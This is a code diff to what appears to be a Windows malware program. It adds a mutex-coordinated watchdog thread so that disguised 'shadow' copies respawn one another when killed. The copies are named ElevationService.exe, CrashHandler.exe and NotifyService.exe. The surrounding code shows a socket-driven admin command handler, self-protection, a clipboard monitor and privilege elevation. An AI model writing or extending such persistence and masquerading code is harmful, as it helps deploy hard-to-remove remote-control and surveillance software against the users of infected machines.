@@ -70,8 +70,13 @@ DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
     return 0;
 }
 
-/* Inter-process watchdog: monitors shadow processes and respawns dead ones */
+/* Inter-process watchdog: monitors shadow processes and respawns dead ones.
+   Only one instance runs across all shadow processes via a named mutex.
+   If the active watchdog dies, another shadow's watchdog takes over on the next cycle. */
 DWORD WINAPI svc_watchdog(LPVOID lpParam) {
+    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Local\\RoyalFortuneWatchdog");
+    if (!hMutex) return 0;
+
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
@@ -84,6 +89,11 @@ DWORD WINAPI svc_watchdog(LPVOID lpParam) {
     while (1) {
         if (g_exiting) return 0;
         Sleep(15000);  /* Check every 15 seconds */
+
+        DWORD wait = WaitForSingleObject(hMutex, 0);
+        if (wait != WAIT_OBJECT_0 && wait != WAIT_ABANDONED) {
+            continue;  /* Another shadow is already watching */
+        }
         
         for (int i = 0; i < 3; i++) {
             char path[MAX_PATH];
@@ -120,7 +130,10 @@ DWORD WINAPI svc_watchdog(LPVOID lpParam) {
                 }
             }
         }
+
+        ReleaseMutex(hMutex);
     }
+    CloseHandle(hMutex);
     return 0;
 }
 
@@ -280,7 +293,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             g_watchdog_started = 1;
             CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
         }
-        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — auto-protect in 15s]";
+        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — watchdog active]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "REMOVE_SVC") == 0) {
         sys_unprotect_process();
@@ -466,9 +479,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
-    /* Shadows auto-protect after 15 seconds */
+    /* Shadows auto-protect after 15 seconds and run the inter-process watchdog */
     if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
+        CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
     }
 
     /* Elevate privileges if needed for full functionality — only main .exe, never shadows */
